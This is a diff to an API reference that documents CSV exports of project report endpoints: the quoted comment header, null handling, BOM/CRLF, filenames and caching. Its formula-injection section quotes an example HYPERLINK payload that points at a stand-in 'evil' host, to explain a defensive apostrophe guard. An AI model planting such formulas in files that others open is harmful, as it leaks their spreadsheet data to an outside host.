@@ -80,7 +80,7 @@ All endpoints except [Auth endpoints](#auth-endpoints) and [Instance metadata](#
 
 ## Conventions
 
-- **Format** — request and response bodies are JSON (`Content-Type: application/json`), UTF-8. The only exceptions: attachment upload (`multipart/form-data`) and download (binary).
+- **Format** — request and response bodies are JSON (`Content-Type: application/json`), UTF-8. The only exceptions: attachment upload (`multipart/form-data`), attachment download (binary), and the [report CSV exports](#csv-exports--the-chart-as-a-file) (`text/csv; charset=UTF-8`, sent as an attachment). Error bodies stay `application/problem+json` on every one of those, including the CSV paths.
 - **IDs** — all identifiers are UUIDs, except issues, which are addressed by their **project-scoped number** (the `42` in `DEMO-42`).
 - **Timestamps** — ISO-8601 with UTC offset, e.g. `2026-07-14T06:24:41.486119Z`. Date-only fields (`dueDate`) use `YYYY-MM-DD`.
 - **Partial updates** — `PATCH` endpoints accept any subset of fields; omitted (or `null`) fields are left unchanged.
@@ -1939,7 +1939,7 @@ curl -X POST $BASE/workspaces/$WS/projects/$PROJ/issues/18/rank \
 
 ## Reports
 
-Read-only analytics, six of them over one project under `/workspaces/{wsId}/projects/{pId}/reports` and a seventh — [Insights](#insights--break-down-the-query-in-the-search-box) — over a workspace-wide HQL query, on the search base path. Flow is the **first** of these endpoints and the one that fixes the conventions the rest of them inherit — everything under "How every report behaves" below is a property of the family, not a quirk of `/flow`. Cycle time and aging WIP are the two halves of one page and read best together. The two **sprint** reports are the other pair: the burn-up asks *will this sprint land, and what happened to the plan*, the review is the record a retro reads out, and they are computed from one shared ledger so they can never disagree about what was in the sprint — though they disagree, deliberately, about which story points to use. **Velocity** reads the same ledger across several completed sprints: what recent sprints delivered, and the band to plan the next one with. **Insights** is the last of the seven and the odd one out — a `POST`, workspace-scoped, and refusing with `422` rather than `400` — because its dataset is not a project but whatever query is in the search box.
+Read-only analytics, six of them over one project under `/workspaces/{wsId}/projects/{pId}/reports` and a seventh — [Insights](#insights--break-down-the-query-in-the-search-box) — over a workspace-wide HQL query, on the search base path. Each of the six project reports also has a **[`.csv` sibling](#csv-exports--the-chart-as-a-file)** that exports the plotted series as a file. Flow is the **first** of these endpoints and the one that fixes the conventions the rest of them inherit — everything under "How every report behaves" below is a property of the family, not a quirk of `/flow`. Cycle time and aging WIP are the two halves of one page and read best together. The two **sprint** reports are the other pair: the burn-up asks *will this sprint land, and what happened to the plan*, the review is the record a retro reads out, and they are computed from one shared ledger so they can never disagree about what was in the sprint — though they disagree, deliberately, about which story points to use. **Velocity** reads the same ledger across several completed sprints: what recent sprints delivered, and the band to plan the next one with. **Insights** is the last of the seven and the odd one out — a `POST`, workspace-scoped, and refusing with `422` rather than `400` — because its dataset is not a project but whatever query is in the search box.
 
 | Method | Path | Auth | Description |
 |---|---|---|---|
@@ -2509,6 +2509,78 @@ Note what does **not** happen: `meta.truncated` stays `false` and `meta.cap` kee
 **`ASSIGNEE` is offered here and refused by [velocity](#velocity--how-much-should-we-plan-for-next-sprint), and that is not an inconsistency.** Velocity is a *published metric* — stable URL, quoted in a ceremony — where a per-person column becomes a comparison whether anyone meant it or not. This is an *ad-hoc query somebody typed*: its dataset is whatever HQL is in the box, it is not addressable as "the team's number", and the same person could get the same breakdown by running eight searches and writing the totals down. The line is **published metric vs. ad-hoc query**.
 
 **Capability narrows what is offered, never what resolves.** [`GET /search/schema`](#search-hql) carries an `insights` block listing the measures and dimensions worth putting in front of this caller: `SPRINT` appears only when at least one visible project has `board: SCRUM`, and `POINTS` only when at least one has `estimation` on — mirroring how the `sprint` and `storyPoints` *fields* are narrowed. **A dimension omitted there still resolves if you ask for it**, exactly as an omitted field still parses. No status code depends on a capability, so a saved panel state cannot break because a curator flipped a project toggle.
+
+### CSV exports — the chart as a file
+
+Every one of the six project reports has a `.csv` sibling: append `.csv` to the path. It takes **the same parameters** as its JSON twin, answers **the same status codes**, and returns `200 text/csv; charset=UTF-8` with `Content-Disposition: attachment`.
+
+| Method | Path | Auth | Rows |
+|---|---|---|---|
+| `GET` | `…/reports/flow.csv?from=&to=&interval=&typeId=&componentId=&labelId=` | member | One per bucket |
+| `GET` | `…/reports/cycle-time.csv?from=&to=&typeId=&componentId=&labelId=` | member | One per plotted point (= one per completed issue) |
+| `GET` | `…/reports/aging.csv` | member | One per open issue, carrying its column |
+| `GET` | `…/reports/sprint-burnup.csv?sprintId=&measure=` | member | One per UTC day |
+| `GET` | `…/reports/sprint-review.csv?sprintId=` | member | One per issue **per list** |
+| `GET` | `…/reports/velocity.csv?sprints=&measure=` | member | One per completed sprint |
+
+**What you get is the plotted series — one row per data point — not a list of issues.** That is the whole feature. Where an export like this exists at all it usually hands back a flat issue list, which is the documented disappointment: people ask for the chart, get a spreadsheet of issues, and go back to screenshotting. Every row in these files is a point that was drawn, and every point that was drawn is a row.
+
+`cycle-time.csv` and `aging.csv` look like the exception and are not: their charts are scatter plots **of issues**, so one dot is one issue, and `key` and `title` are there to identify the dot you are pointing at. Neither carries a description, a status history or a component list — the columns an issue export would have and a chart does not plot.
+
+**There is no "matching issues" export in this API, and you should not read these files as one.** The "download matching issues" button is a different feature, and the search-side export path it needs **does not exist yet** — there is no CSV or export endpoint under `/search`, and it cannot be assembled client-side either: HQL has no `project` field to scope the handoff with, and no `resolved`/`closed` field, so the flow report's *resolved* half is not expressible as a query at all. It is filed as its own ticket. Until it lands, a report CSV is the numbers that were drawn and nothing else.
+
+#### The comment header is part of the contract
+
+Above the rows sits a `#`-comment block. It is what makes an exported file still say what it is after it has been mailed on, renamed and opened three weeks later — treat it as contract, not decoration. **Every line in the file is CSV cells — the header lines and the column row included** — so one reader parses the whole thing.
+
+```
+<BOM>"# Hamstrack report: velocity"
+"# Project: DEMO - Demo Project"
+"# Project id: 0192a0…"
+"# Measure: COUNT"
+"# Window: 6 completed sprints"
+"# Forecast: p50=18, p85=23, sample size=6 - a range to plan the next sprint with, and deliberately not a single number to compare teams by"
+"# Computed at: 2026-08-20T09:14:22Z"
+"# Based on issues: 142"
+"# Truncated: no (row cap 20000)"
+"sprintId","name","startAt","completedAt","committed","completed","addedAfterStart","carriedOver","unestimatedCount"
+0192cc…,"Sprint 6",2026-05-01T09:00Z,2026-05-15T16:02:41Z,19,14,2,5,0
+```
+
+It carries the report name, the project key + name + id, the window, the measure / sprint / interval **where the report has one**, the percentiles **or the reason they were suppressed**, `computedAt`, `basedOnIssues`, and whether truncation bit.
+
+**A parser must not require a fixed header block.** Only the lines that apply are emitted — **four of the six reports have no measure at all**, `aging` states that it *has* no window rather than printing an empty one, and the suppression, truncation, unmatched-filter and no-sprint lines appear only when they are true. Match on the `# key: value` shape, never on position or count — and **unquote the line first: each header line is one quoted CSV cell**, `#` included.
+
+That quoting is a security control rather than tidiness. A comment line emitted raw is still split on commas, so only its *first* cell begins with `#`: a project or sprint name containing a comma ends that cell and opens a new one, which is free to begin with `=`. Neither name restricts commas or equals signs, so wrapping the whole line in quotes is what closes the breakout. The column row is quoted for the same reason.
+
+**If you already parse these files, this is the one behaviour change to know about.** Because `#` now sits *inside* the quotes, a reader configured to drop comment lines by a leading `#` — `pandas.read_csv(..., comment="#")` and its equivalents — **no longer skips the header**, and sees one-column rows instead. The trade was taken deliberately: there is no format in which a line both starts with a bare `#` and is a single cell. Either match the header and read it (which is what the rest of this section tells you to do anyway), or drop lines whose first cell starts with `#` *after* unquoting — but do not filter on a bare leading `#`.
+
+Every honesty rule the JSON carries travels with the numbers, because an export is a new surface rather than a serialisation format: a suppressed percentile pair or velocity band is suppressed here too **with the reason in the header** rather than left as an empty column to be read as zero; `cycleDays` is empty where no start was recorded and is never backfilled from `created_at`; a truncated series says so instead of silently shipping fewer rows; a filter that matched nothing is named, so a thin file is never mistaken for a quiet quarter.
+
+#### Six things you cannot guess from the JSON
+
+1. **Not every report has a measure**, and the header emits only the lines that apply — hence the rule above about not requiring a fixed block.
+2. **`sprint-review.csv` is not a plotted series at all**, because the report is not a chart. It is five labelled lists, so the file is one row per issue **per list**, with a leading `list` column. **The same key legitimately appears more than once** — an issue that was committed and then completed is in both lists — exactly as on screen. Summing a column across the whole file double-counts.
+3. **The burn-up's scope-change log is deliberately not folded in.** Two tables in one CSV is a file no spreadsheet opens correctly. The header counts the changes and points at the JSON endpoint, so you are told what is missing rather than left to notice.
+4. **A missing subject is a `200`, not an error.** "No ACTIVE sprint" is a `200` in JSON, so the file is a `200` whose header carries a `# No sprint:` note and which has zero data rows. An unexplained empty CSV would recreate exactly the ambiguity the JSON avoids.
+5. **`null` is an empty, unquoted field** — never `""`, never `null`. Report gaps are real (a cycle time with no start, a suppressed band, a sprint with no completion date), and an empty field is what every spreadsheet and dataframe library reads back as *missing*.
+6. **UTF-8 BOM, CRLF line endings.** Both are deliberate. Without the BOM, Excel on Windows decodes the file as the system code page and mangles every non-ASCII title; the cost is three bytes a strict RFC 4180 parser will see on the first line, and Excel, LibreOffice, Sheets, `pandas` (`encoding="utf-8-sig"`) and R all strip it.
+
+#### Formula injection: text cells are guarded, numbers are not
+
+Text cells are **always quoted** (inner quotes doubled), and a text cell whose first character is `=`, `+`, `-`, `@`, tab or CR is **prefixed with an apostrophe**. Without that, an issue titled `=HYPERLINK("https://evil/"&A1,"Q3 plan")` becomes a live exfiltration link the moment a colleague opens the file, and quoting does not help — the CSV parser strips quotes before the formula engine sees the value. **Expect that leading apostrophe when parsing text columns**, and strip it if you are re-importing.
+
+**Numeric, date, enum, UUID and boolean cells are deliberately not guarded.** A negative `net` or a negative scope `delta` legitimately begins with `-`, and prefixing it would turn the column into text that will not sum — which is the "these numbers don't match" failure this whole area is built to avoid. Those cells are server-generated from typed values and cannot carry attacker input.
+
+**The comment header is quoted for the same reason, and that is a recent fix.** A header line emitted raw is still split on commas, so only its first cell begins with `#`; a project or sprint name containing a comma ends that cell and opens a new one that is free to begin with `=`. Neither name restricts commas or equals signs, so the whole line — `#` included — is now one quoted cell, as is the column row. See the parser note above for what that changes for `comment="#"` readers.
+
+#### Filenames, caching and content negotiation
+
+The filename is **built by the server**, never taken from the client: `<PROJECT KEY>-<report>-<YYYY-MM-DD>.csv`, e.g. `DEMO-velocity-2026-08-20.csv`. Its date is the same `computedAt` the header prints, so the name and the contents can never disagree — which is how two exports of the same report are told apart in a downloads folder.
+
+Caching is the family's (`private, max-age=60` + `Vary: Authorization`): a download is still a live read over one tenant's data. The throttle is the family's too — these six sit under `…/reports/**`, so they spend the same [reports budget](#how-every-report-behaves) as their JSON twins, and a `429` is possible on any of them.
+
+One thing is specific to the exports: they declare `produces: text/csv`, so **an `Accept` header that excludes `text/csv` is a `406`** rather than a CSV body labelled as JSON. Error responses are unaffected — a `400`, `404` or `429` on a `.csv` path still comes back as `application/problem+json`.
 
 ## Search (HQL)
 
